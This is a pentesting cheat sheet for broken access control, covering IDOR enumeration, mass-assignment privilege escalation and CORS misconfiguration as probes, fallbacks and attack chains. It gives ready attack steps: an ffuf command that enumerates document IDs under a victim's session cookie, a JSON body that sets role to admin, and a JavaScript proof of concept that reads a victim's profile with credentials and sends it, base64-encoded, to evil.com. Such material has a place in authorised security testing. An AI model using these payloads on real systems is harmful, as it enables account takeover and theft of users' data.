## Broken Access Control (IDOR, Privilege Escalation, CORS)

### IDOR (Insecure Direct Object Reference)

- **[Primary Probe]** Enumerate numeric/UUID refs in path/body; replay under different sessions via Burp Intruder + Authz extension
  - **[Signal: Cross-account data returned]** Confirm via diff; escalate to write ops (PUT/DELETE with victim ID)
  - **[Dead End: Opaque UUIDs]** Harvest UUIDs from public feeds, email headers, API errors, JS variable dumps
  - **[Dead End: 403 returned]** Second-order IDOR: set victim UUID in benign field (profile pic, prefs) → trigger indirect access
  - **[Dead End: Same response regardless of ID]** Mass enum: `ffuf -u "https://target/api/doc/FUZZ" -w ids.txt -H "Cookie: victim_sess" -mc 200` → compare content-length
  - **[Data Chaining]** Leaked admin UUID → `PATCH /api/users/<uuid>/role` → escalation

### Privilege Escalation / Mass Assignment

- **[Primary Probe]** Capture account update; add undocumented keys: `{"role":"admin","isAdmin":true,"plan":"enterprise","credits":9999}`
  - **[Signal: Role promoted]** Re-fetch profile to confirm; escalate to sensitive function access
  - **[Dead End: Unknown keys rejected]** Mine JS bundles for internal keys: `grep -Eo '"[a-zA-Z_]+"' app.js | sort -u`
  - **[Dead End: Strict schema validation]** Try HTTP method override: `X-HTTP-Method-Override: PATCH` on POST to read-only endpoint

### CORS Misconfiguration

- **[Primary Probe]** Add `Origin: https://evil.com` to authenticated API requests; check for `Access-Control-Allow-Origin: https://evil.com` + `Access-Control-Allow-Credentials: true`
  - **[Signal: Reflected origin + credentials]** PoC XS-leak:
    ```javascript
    fetch('https://target/api/me',{credentials:'include'})
    .then(r=>r.json()).then(d=>fetch('https://evil.com/?d='+btoa(JSON.stringify(d))))
    ```
  - **[Dead End: Whitelist enforced]** Try null origin or subdomain variants: `Origin: https://target.evil.com`
  - **[Dead End: Credentials not forwarded]** CORS sans credentials still exposes API structure, hostnames, predictable non-sensitive data
  - **[Data Chaining]** CORS leak → internal hostname → new SSRF target
